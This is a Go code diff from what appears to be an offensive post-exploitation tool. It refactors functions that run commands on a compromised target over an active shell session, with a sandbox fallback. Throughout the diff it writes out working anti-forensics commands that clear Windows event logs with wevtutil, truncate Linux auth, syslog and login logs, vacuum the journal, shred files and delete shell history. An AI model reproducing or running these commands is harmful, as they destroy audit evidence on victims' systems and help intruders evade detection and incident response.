@@ -9,94 +9,72 @@ import (
 	"github.com/0xP4X/drogonclaw-go/internal/shell"
 )
 
+// runTarget runs a command on the target over an active shell session when one
+// is available. It returns the session output plus a bool indicating whether a
+// live session was used (false means we fell back to the sandbox container,
+// which does NOT touch the target's own filesystem).
+func runTarget(ctx context.Context, osType, sessionID, sandboxCmd string, sb *sandbox.Docker) (string, error) {
+	if sess, ok := shell.GlobalShells.Get(sessionID); ok {
+		out, err := sess.Send(sandboxCmd)
+		if err != nil {
+			return "", fmt.Errorf("failed to run %s cleanup over session %s: %v", osType, sessionID, err)
+		}
+		return fmt.Sprintf("[+] Executed on target via session %s:\n%s", sessionID, out), nil
+	}
+	out, err := sb.Execute(ctx, sandboxCmd)
+	if err != nil {
+		return "", fmt.Errorf("failed to run %s cleanup (sandbox fallback): %v", osType, err)
+	}
+	return fmt.Sprintf("[!] No active %s session — action ran inside the SANDBOX container filesystem, NOT the target. Provide session_id to act on the target host.\n%s", osType, out), nil
+}
+
+const osWindows = "windows"
+
 // WipeEventLogs clears system audit logs on the target.
-// For Windows targets, commands are sent over an active shell session (sessionID).
-// For Linux targets, commands execute inside the sandbox directly.
+// Commands are sent over an active shell session when session_id is valid;
+// otherwise they run inside the sandbox (container-local only).
 func WipeEventLogs(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
 	osType = strings.ToLower(osType)
 
-	if osType == "windows" {
-		s, ok := shell.GlobalShells.Get(sessionID)
-		if !ok {
-			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows log wiping", sessionID)
-		}
-		// wevtutil cl runs natively on the Windows target through the reverse shell
-		cmd := `cmd /c "wevtutil cl System 2>nul & wevtutil cl Security 2>nul & wevtutil cl Application 2>nul & wevtutil cl Setup 2>nul & echo [+] Windows Event Logs wiped."`
-		out, err := s.Send(cmd)
-		if err != nil {
-			return "", fmt.Errorf("failed to wipe Windows event logs: %v", err)
-		}
-		return fmt.Sprintf("[+] Windows Event Logs cleared via session %s.\n%s", sessionID, out), nil
+	if osType == osWindows {
+		cmd := `cmd /c "wevtutil cl System 2>nul & wevtutil cl Security 2>nul & wevtutil cl Application 2>nul & wevtutil cl Setup 2>nul & wevtutil cl Microsoft-Windows-PowerShell/Operational 2>nul & echo [+] Windows Event Logs wiped."`
+		return runTarget(ctx, osType, sessionID, cmd, sb)
 	}
 
-	// Linux: run directly in the sandbox
-	cmd := `sh -c 'cat /dev/null > /var/log/auth.log 2>/dev/null; cat /dev/null > /var/log/syslog 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; echo "[+] Linux Authentication and Syslog wiped successfully."'`
-	out, err := sb.Execute(ctx, cmd)
-	if err != nil {
-		return "", fmt.Errorf("failed to wipe logs: %v", err)
-	}
-	return out, nil
+	cmd := `sh -c 'cat /dev/null > /var/log/auth.log 2>/dev/null; cat /dev/null > /var/log/syslog 2>/dev/null; cat /dev/null > /var/log/secure 2>/dev/null; cat /dev/null > /var/log/messages 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null; cat /dev/null > /var/log/wtmp 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; history -c 2>/dev/null; echo "[+] Linux auth/syslog journal wiped."'`
+	return runTarget(ctx, osType, sessionID, cmd, sb)
 }
 
 // SecureDelete securely overwrites and deletes a file to prevent forensic recovery.
-// For Windows targets, uses cipher /w (built-in secure overwrite) via live shell session.
-// For Linux targets, uses shred inside the sandbox.
+// Uses cipher /w (Windows) or shred (Linux). Runs over the live session when
+// available; otherwise falls back to the sandbox (container-local only).
 func SecureDelete(ctx context.Context, filePath, osType, sessionID string, sb *sandbox.Docker) (string, error) {
 	osType = strings.ToLower(osType)
 
-	if osType == "windows" {
-		s, ok := shell.GlobalShells.Get(sessionID)
-		if !ok {
-			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows secure delete", sessionID)
-		}
-		// cipher /w performs a 3-pass DOD-style overwrite of free space in the file's directory.
-		// We first delete the file, then wipe the freed space so forensic recovery is prevented.
-		dir := `%TEMP%`
+	if osType == osWindows {
+		dir := "%TEMP%"
 		if idx := strings.LastIndexAny(filePath, `/\`); idx != -1 {
 			dir = filePath[:idx]
 		}
 		cmd := fmt.Sprintf(`cmd /c "del /f /q "%s" 2>nul & cipher /w:"%s" & echo [+] %s securely deleted (3-pass wipe)."`, filePath, dir, filePath)
-		out, err := s.Send(cmd)
-		if err != nil {
-			return "", fmt.Errorf("secure delete failed: %v", err)
-		}
-		return fmt.Sprintf("[+] Secure delete complete via session %s.\n%s", sessionID, out), nil
+		return runTarget(ctx, osType, sessionID, cmd, sb)
 	}
 
-	// Linux: shred inside the sandbox
 	cmd := fmt.Sprintf(`sh -c 'shred -u -z -n 3 "%s" 2>/dev/null || rm -f "%s"; echo "[+] %s securely shredded and removed."'`, filePath, filePath, filePath)
-	out, err := sb.Execute(ctx, cmd)
-	if err != nil {
-		return "", fmt.Errorf("secure delete failed: %v", err)
-	}
-	return out, nil
+	return runTarget(ctx, osType, sessionID, cmd, sb)
 }
 
 // ClearShellHistory clears bash/zsh history (Linux) or PSReadLine history (Windows).
-// For Windows targets, commands are sent over an active shell session (sessionID).
-// For Linux targets, commands execute inside the sandbox directly.
+// Runs over the live session when available; otherwise falls back to the sandbox
+// (container-local only).
 func ClearShellHistory(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
 	osType = strings.ToLower(osType)
 
-	if osType == "windows" {
-		s, ok := shell.GlobalShells.Get(sessionID)
-		if !ok {
-			return "", fmt.Errorf("session %s not found — a live Windows shell session is required for Windows history clearing", sessionID)
-		}
-		// Remove PSReadLine history file on the target
+	if osType == osWindows {
 		cmd := `powershell -NoProfile -Command "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null; Write-Output '[+] PowerShell history cleared.'"`
-		out, err := s.Send(cmd)
-		if err != nil {
-			return "", fmt.Errorf("history clear failed: %v", err)
-		}
-		return fmt.Sprintf("[+] Windows shell history cleared via session %s.\n%s", sessionID, out), nil
+		return runTarget(ctx, osType, sessionID, cmd, sb)
 	}
 
-	// Linux: clear history inside the sandbox
-	cmd := `sh -c 'unset HISTFILE; rm -f ~/.bash_history ~/.zsh_history ~/.sh_history; history -c 2>/dev/null; echo "[+] Linux shell history sanitized."'`
-	out, err := sb.Execute(ctx, cmd)
-	if err != nil {
-		return "", fmt.Errorf("history clear failed: %v", err)
-	}
-	return out, nil
+	cmd := `sh -c 'unset HISTFILE; rm -f ~/.bash_history ~/.zsh_history ~/.sh_history; history -c 2>/dev/null; find / -maxdepth 3 -name ".bash_history" -delete 2>/dev/null; echo "[+] Linux shell history sanitized."'`
+	return runTarget(ctx, osType, sessionID, cmd, sb)
 }
